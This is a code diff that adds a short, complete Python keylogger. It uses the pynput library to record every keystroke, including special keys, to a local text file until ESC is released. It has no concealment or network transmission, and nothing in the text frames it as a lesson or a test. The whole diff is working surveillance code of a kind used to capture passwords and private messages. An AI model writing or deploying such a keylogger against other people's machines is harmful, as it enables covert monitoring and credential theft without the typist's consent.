@@ -1,0 +1,26 @@
+from pynput import keyboard
+import os
+
+# Define the log file name and path
+log_file = "key_log.txt"
+
+# Create or clear the log file at the start of the program
+if os.path.exists(log_file):
+    os.remove(log_file)
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as log:
+            log.write(f"{key.char}\n")  # Log the character pressed
+    except AttributeError:
+        with open(log_file, "a") as log:
+            log.write(f"{key}\n")  # Log special keys (like space, enter)
+
+def on_release(key):
+    # Stop listener on specific key release, e.g., ESC
+    if key == keyboard.Key.esc:
+        return False
+
+# Set up the listener to record keystrokes
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
